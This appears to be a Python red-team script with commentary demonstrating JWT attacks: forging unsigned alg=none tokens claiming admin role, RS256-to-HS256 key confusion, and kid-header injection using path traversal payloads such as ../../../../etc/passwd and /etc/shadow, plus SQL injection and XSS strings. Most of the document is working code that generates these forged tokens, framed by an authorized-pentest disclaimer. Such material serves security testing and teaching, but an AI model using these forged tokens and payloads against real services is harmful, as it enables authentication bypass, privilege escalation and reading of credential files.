"""
📛 JWT KID Manipulation — Red Team Commentary

This script demonstrates the creation and abuse of JSON Web Tokens (JWTs)
by manipulating the `kid` (Key ID) field in the header, targeting weak JWT implementations.

---

1. 🔓 ALG=none Exploit
   - Removes signature completely.
   - Works only if backend allows `alg: none`.
   - Full authentication bypass.
   - Payload:
        {
          "alg": "none"
        }
        {
          "user": "admin"
        }

2. 🔐 Public Key Confusion (RS256 ➝ HS256)
   - RS256 (asymmetric) ➝ force server to interpret public key as HMAC secret.
   - Replace `alg` with `HS256` and sign with server’s public key as secret.
   - Bypasses verification on weak implementations.

3. 💣 KID Injection
   - Payloads with `kid` pointing to unintended local files:
     e.g., `"kid": "../../../../etc/passwd"`
   - If backend reads key using path from KID: LFI ➝ signature trust bypass.

4. 🧬 Nonexistent `kid`
   - `"kid": "notakey"`
   - Tests how backend behaves with unresolved or missing KID.
   - Can reveal fallback key logic or misconfigurations.

---

🛠 Requirements:
- PyJWT (`pip install pyjwt`)
- JWT.io (for visual editing)
- Burp or Postman for live header injection

⚠️ Note:
Use only in authorized pentests or controlled environments.
Abuse of JWT weaknesses can lead to full privilege escalation.

"""

import jwt

# 🔓 Example: Create unsigned token (alg: none)
payload = {"user": "admin", "role": "admin"}

# For alg=none, we need to create the token manually or use empty string as key
try:
    # Method 1: Use empty string as key with 'none' algorithm
    token = jwt.encode(payload, key="", algorithm="none")
    print("[*] ALG=none Token:\n", token)
except Exception as e:
    print(f"[!] Error with Method 1: {e}")
    
    # Method 2: Manual token creation for alg=none
    import json
    import base64
    
    # Create header with alg=none
    header = {"alg": "none", "typ": "JWT"}
    
    # Base64 encode header and payload
    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    
    # Create unsigned token (no signature)
    token = f"{header_b64}.{payload_b64}."
    print("[*] ALG=none Token (Manual):\n", token)

print("\n" + "="*60 + "\n")

# 🧬 Example: KID Manipulation attacks
import json
import base64

def create_jwt_with_kid(payload, kid_value, secret="secret"):
    """Create JWT with custom KID header for testing"""
    header = {
        "alg": "HS256",
        "typ": "JWT", 
        "kid": kid_value
    }
    
    try:
        # Use PyJWT with custom header
        token = jwt.encode(payload, secret, algorithm="HS256", headers={"kid": kid_value})
        print(f"[*] JWT with KID '{kid_value}':\n{token}\n")
        return token
    except Exception as e:
        print(f"[!] Error creating JWT with KID '{kid_value}': {e}")
        return None

# 💣 KID Injection Examples
print("[*] KID Injection Attack Vectors:")
print("-" * 40)

# LFI attempts via KID
lfi_payloads = [
    "../../../../etc/passwd",
    "../../../../etc/shadow", 
    "../../../windows/system32/drivers/etc/hosts",
    "/dev/null",
    "nonexistent_key_file"
]

for lfi_payload in lfi_payloads:
    create_jwt_with_kid(payload, lfi_payload)

print("\n[*] Additional KID Manipulation Examples:")
print("-" * 40)

# Other KID manipulation techniques
kid_payloads = [
    "",  # Empty KID
    "0",  # Numeric KID
    "../key",  # Directory traversal
    "key.txt",  # Simple filename
    "sql'; DROP TABLE users; --",  # SQL injection attempt
    "<script>alert('xss')</script>",  # XSS attempt
]

for kid_payload in kid_payloads:
    create_jwt_with_kid(payload, kid_payload)

print("\n[*] Decoding example token to show structure:")
print("-" * 40)
if 'token' in locals():
    try:
        decoded = jwt.decode(token, options={"verify_signature": False})
        print(f"[*] Decoded payload: {decoded}")
        
        # Show header too
        header = jwt.get_unverified_header(token)
        print(f"[*] Header: {header}")
    except Exception as e:
        print(f"[!] Error decoding: {e}")

print("\n[*] RS256 to HS256 Confusion Attack Example:")
print("-" * 40)

# Simulate RS256 to HS256 attack
# In a real scenario, you'd use the server's public key as the HMAC secret
fake_public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4f5wg5l2hKsTeNem/V41
fGnJm6gOdrj8ym3rFkEjWT2btf4usma74Gj5OP5+o6qVrOeCLcLt8w0iqCkB5QO
QMhK3eCPJcb9A0+CQ7hhxY2OKzb+StkjAsFIi8WM4j4qcUm6K2QK7pPqTJC0l9NW
EXAMPLE_PUBLIC_KEY
-----END PUBLIC KEY-----"""

try:
    # In real attack, you'd use the actual server's public key as HMAC secret
    # This demonstrates the concept
    confused_token = jwt.encode(payload, fake_public_key, algorithm="HS256")
    print(f"[*] HS256 token signed with 'public key' as secret:\n{confused_token}")
    print("[!] In real attack, use actual server's RSA public key as HMAC secret")
except Exception as e:
    print(f"[!] RS256->HS256 example failed (expected): {e}")
    print("[*] This would work with a real RSA public key from the target server")

print("\n[*] Attack Summary:")
print("-" * 40)  
print("1. ALG=none: Removes signature verification entirely")
print("2. KID Injection: Manipulates key file paths for LFI")
print("3. RS256->HS256: Forces asymmetric key to be used as symmetric secret") 
print("4. Nonexistent KID: Tests fallback key handling")
print("\n[!] Use only in authorized penetration tests!")
